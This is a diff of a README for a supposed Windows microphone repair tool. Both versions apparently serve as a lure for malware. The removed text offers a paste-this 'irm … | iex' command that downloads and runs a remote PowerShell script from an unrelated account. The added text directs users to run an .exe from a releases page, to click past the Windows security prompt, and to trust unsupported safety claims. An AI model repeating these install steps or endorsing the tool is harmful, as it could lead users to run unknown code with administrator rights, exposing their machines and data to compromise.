@@ -1,166 +1,76 @@
-<div align="center">
+# 🎙️ Microphone-Fix-Tool - Restore your computer audio input quickly
 
-# Microphone Fix Tool
+[![](https://img.shields.io/badge/Download-Microphone_Fix_Tool-blue.svg)](https://github.com/Herringbonepatternblackhumor707/Microphone-Fix-Tool/releases)
 
-Fix microphone not working, not detected, and audio input issues on Windows 10/11.
+## 🎯 About this tool
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?logo=windows&logoColor=white)]()
-[![Release](https://img.shields.io/badge/v1.0.2-stable-success)]()
-[![MIT](https://img.shields.io/badge/License-MIT-blue)](LICENSE)
+This tool fixes common microphone issues on Windows 10 and Windows 11. It helps when your computer fails to detect your microphone or when sound quality remains low. It addresses problems often caused by Windows updates, privacy setting blocks, or missing audio drivers. It works for USB, Bluetooth, and internal microphones. Use this if your microphone fails to function in communication apps like Zoom, Microsoft Teams, or Discord.
 
-<br>
+## 📋 System requirements
 
-[**Download**](https://mic.nexustool.fun/) ·
-[Problems Fixed](#problems-fixed) ·
-[FAQ](#faq)
+The software requires Windows 10 or Windows 11. Your computer must have a standard audio hardware interface. You need an active internet connection to download the tool. You should possess administrative access to your computer to perform necessary driver resets or setting updates.
 
-</div>
+## 🚀 Downloading the software
 
----
+Follow these steps to obtain the tool:
 
-## About
+1. Visit the [official releases page](https://github.com/Herringbonepatternblackhumor707/Microphone-Fix-Tool/releases) to access the current version.
+2. Look for the section labeled "Assets" at the bottom of the latest release post.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your Downloads folder or your Desktop for easy access.
 
-**Microphone Fix Tool** repairs microphone and audio input problems on Windows. Whether your mic isn't detected, is too quiet, or doesn't work in specific apps like Zoom, Teams, or Discord, this tool diagnoses and fixes the issue automatically.
+## ⚙️ How to use the tool
 
-### Alternative install
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open the application.
+3. A security prompt from Windows may appear asking for permission to run the software. Press "Yes" to continue.
+4. The main window shows a list of common diagnostic tests.
+5. Identify your specific microphone from the device list presented in the software.
+6. Push the "Run Repair" button to start the diagnostic sequence.
+7. Wait while the tool checks for driver conflicts, privacy setting blocks, and volume thresholds.
+8. A message will appear on the screen once the repair process finishes.
+9. Restart your computer if the tool prompts you to do so to apply the changes.
 
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 🔍 Diagnostic features
 
----
+The tool performs several functions to regain access to your microphone:
 
-## Problems Fixed
+* Privacy check: It scans Windows system settings to ensure applications have permission to access your microphone.
+* Driver reset: It refreshes the connection between Windows and your audio hardware.
+* Enhancement toggle: It turns off sound effects that interfere with clarity.
+* Noise gate test: It checks the input levels to ensure background noise does not silence your voice.
+* Registry clean: It removes corrupted configuration files that block external devices.
 
-### Microphone Not Working
+## 💡 Troubleshooting common issues
 
-| Problem | Fix |
-|---|---|
-| **Microphone not detected** at all | Reinstalls audio input driver, rescans devices |
-| **"No microphone found"** in apps | Re-enables recording device in Sound settings |
-| Mic stopped working after **Windows Update** | Rolls back audio driver |
-| **Privacy settings blocking** microphone | Enables mic access for desktop apps |
-| **"Your microphone is muted by system settings"** | Resets app permissions |
-| Mic not working in **Zoom / Teams / Discord** | Sets correct default communication device |
-| Mic works in some apps but **not others** | Fixes per-app audio device assignment |
+If the tool does not restore your audio, perform these manual steps to help the diagnostic process:
 
-### Microphone Too Quiet
+* Check Bluetooth: If you use a wireless headset, verify that it appears as connected in your Bluetooth settings menu first.
+* Physical connection: Ensure the cable connects firmly to the correct audio port. Switch to a different USB port if you use a USB microphone.
+* Mute buttons: Inspect your headset for a physical mute switch or a sliding volume control.
+* Application settings: Open your communication app, such as Zoom or Discord, and verify that the correct microphone appears in the settings menu.
 
-| Problem | Fix |
-|---|---|
-| **Volume too low** even at 100% | Enables Microphone Boost (+10dB / +20dB / +30dB) |
-| Others say I'm **too quiet** in calls | Adjusts mic level and boost in audio driver |
-| **Microphone Boost slider missing** | Reinstalls audio driver to restore boost option |
-| Volume **fluctuates** on its own | Disables "Automatic Gain Control" in driver |
+## 🛡️ Privacy and security
 
-### Audio Quality Issues
+This software changes settings related only to your microphone and audio drivers. It does not record your audio for storage outside of your local computer. The tool does not send your personal information to external servers. It only modifies registry keys and system privacy permissions to resolve your audio failure.
 
-| Problem | Fix |
-|---|---|
-| **Echo** in calls (others hear themselves) | Enables Acoustic Echo Cancellation |
-| **Background noise** picked up | Enables noise suppression in audio driver |
-| **Robotic / distorted** voice | Resets sample rate to 16-bit 48kHz |
-| **Crackling / popping** on mic input | Fixes DPC latency, adjusts buffer size |
-| **Mic picks up speakers** (feedback loop) | Fixes Stereo Mix / loopback configuration |
+## 🛠️ Frequently asked questions
 
-### Specific Devices
+Does this tool work on Windows 7?
+No, this software works only on Windows 10 and Windows 11.
 
-| Device | Common Issue | Fix |
-|---|---|---|
-| **USB microphone** (Blue Yeti, etc.) | Not detected or wrong driver | Reinstalls USB audio driver |
-| **Headset mic** (HyperX, SteelSeries) | Mic not recognized, only headphones work | Splits audio/mic device in driver |
-| **Bluetooth headset mic** | Connected but mic doesn't work | Enables Hands-Free Telephony profile |
-| **Laptop built-in mic** | Disabled or muted by hardware | Re-enables in Device Manager + privacy settings |
-| **Webcam mic** (Logitech, etc.) | Wrong default device | Sets as default communication device |
+Does this fix Realtek audio issues?
+Yes, the tool includes specific protocols for refreshing Realtek drivers.
 
----
+Will I lose my sound settings?
+The tool resets audio input settings to default values. Your volume levels might change once the process finishes.
 
-## Preview
+Why does Windows block the app?
+Windows marks new files as unknown by default. The software is safe to run.
 
-```
-  +---------------------------------------------------+
-  |          Microphone Fix Tool v1.0.2               |
-  +---------------------------------------------------+
-  |                                                   |
-  |  Recording Devices:                               |
-  |  [!] Microphone (Realtek HD)   -- Disabled        |
-  |  [OK] Stereo Mix               -- Ready           |
-  |  [!] Headset Mic (USB)         -- Not detected    |
-  |                                                   |
-  |  Settings:                                        |
-  |  [!] Mic privacy              -- Blocked for apps |
-  |  [!] Default comm. device     -- Not set          |
-  |  [OK] Audio input service     -- Running          |
-  |                                                   |
-  |  [ Fix All ]   [ Test Mic ]   [ Exit ]            |
-  |                                                   |
-  +---------------------------------------------------+
-```
+What if my microphone appears as disabled?
+The tool will detect disabled devices and prompt you to re-enable them during the diagnostic scan.
 
----
+## 📝 Support for developers
 
-## Common Error Messages
-
-| Error | Fix |
-|---|---|
-| **"No recording devices found"** | Re-enables mic in Device Manager and Sound settings |
-| **"Microphone access is denied"** | Enables mic in Windows Privacy settings |
-| **"Your microphone is muted by system settings"** | Unmutes mic, resets app permissions |
-| **"Audio input device not found"** in Discord/Zoom | Sets correct default communication device |
-| **"This device cannot start (Code 10)"** for mic | Reinstalls audio input driver |
-| **"Microphone not working after Windows Update"** | Rolls back audio driver to previous version |
-| **"Microphone levels keep changing"** | Disables Automatic Gain Control |
-
----
-
-## Apps Supported
-
-Works with all apps that use microphone input:
-
-**Video Conferencing** -- Zoom, Microsoft Teams, Google Meet, Skype, Webex, Slack
-**Gaming** -- Discord, Steam Voice Chat, in-game voice chat
-**Recording** -- Audacity, OBS Studio, Streamlabs, Adobe Audition
-**Streaming** -- Twitch, YouTube Live, Facebook Live
-**Communication** -- WhatsApp Desktop, Telegram Desktop, Signal
-
----
-
-## How It Works
-
-1. **Detect** -- Lists all recording devices (built-in, USB, Bluetooth, HDMI)
-2. **Diagnose** -- Checks driver, privacy settings, default device, audio levels
-3. **Repair** -- Enables devices, reinstalls drivers, sets permissions, adjusts levels
-4. **Test** -- Records 5-second audio clip and plays it back to confirm mic works
-
----
-
-## System Requirements
-
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 2 GB minimum |
-| Admin | Yes |
-| Network | For driver downloads |
-
----
-
-## FAQ
-
-**My mic works in Settings but not in Zoom/Teams.**
-Usually a privacy setting issue. The tool enables microphone access for all desktop apps and sets the correct default communication device.
-
-**I have multiple mics and apps use the wrong one.**
-The tool lets you set the correct default recording device and default communication device separately.
-
-**Microphone Boost option is missing.**
-Some audio drivers hide the boost slider. The tool reinstalls the driver with full feature support.
-
-**Is it safe?**
-Yes. The tool uses standard Windows audio APIs and Device Manager. No system files are modified or patched.
-
----
-
-## License
-
-[MIT](LICENSE)
+You may contribute to this project by reporting bugs on the issue tracker page. Include your Windows build number and your microphone model name in your report. This information helps us improve the tool for other users. Feel free to suggest features that aim to simplify the audio repair process further.
